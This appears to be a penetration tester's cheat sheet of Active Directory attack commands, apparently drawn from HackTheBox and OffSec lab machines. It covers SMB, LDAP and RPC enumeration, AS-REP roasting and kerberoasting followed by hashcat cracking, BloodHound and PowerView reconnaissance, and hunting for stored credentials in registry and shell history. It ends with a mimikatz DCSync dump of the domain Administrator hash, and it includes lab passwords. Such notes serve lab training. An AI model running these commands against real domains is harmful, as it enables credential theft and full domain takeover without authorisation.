# Linux machine

```bash
# nmap
nmap 10.10.10.175 --script=smb-enum* -p445

#crackmapexec(smb/winrm)
crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local


# smbclient
## anon
smbclient -L 10.10.10.175 -N
smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"

> recurse on
> prompt off
> ls


# dns
dig @10.10.10.161 AXFR htb.local


# smbmap
smbmap -H 10.10.10.161
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -u 'guest' -p ''
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5


# enum4linux
enum4linux -a -u "" -p "" dc-ip
enum4linux -a -u "guest" -p "" dc-ip


# rpcclient
## anon
rpcclient 10.10.10.175 -N
rpcclient -U "" -N 10.10.10.161
> enumdomusers
> enumdomgroups


# LDAP
## anon
ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"


# kerbrute
## anon
kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local


# GetNPUsers.py
## anon
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
GetNPUsers.py active.htb/ -dc-ip 10.10.10.100

## with username
GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass

## with username list
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs

## hashcat
hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt




# bloodhound
bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```


# On Victim
```bash
whoami /priv
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

net user /domain
net user fsmith /domain
net group /domain
net group "Sales Department" /domain

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
Get-DomainGroup -MemberIdentity 'svc-alfresco' | select samaccountname


Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Find-LocalAdminAccess
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
Get-NetSession -ComputerName client74
Get-NetUser -SPN | select samaccountname,serviceprincipalname(same as setspn -L iis_service)
Get-ObjectAcl -Identity stephanie
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
Find-DomainShare

> Get-GPO -Name "Default Domain Policy"

<example>
*Evil-WinRM* PS C:\TEMP> Get-GPO -Name "Default Domain Policy"

DisplayName      : Default Domain Policy
DomainName       : vault.offsec
Owner            : VAULT\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 11/19/2021 12:50:33 AM
ModificationTime : 11/19/2021 1:00:32 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 4, SysVol Version: 4
WmiFilter        :

> Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh

<example>
*Evil-WinRM* PS C:\TEMP> Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False



# PsLoggedon.exe
.\PsLoggedon.exe \\files04

cmdkey /list
cat (Get-PSReadlineOption).HistorySavePath
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"


# kerberoast
.\Rubeus.exe kerberoast





# mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'



```

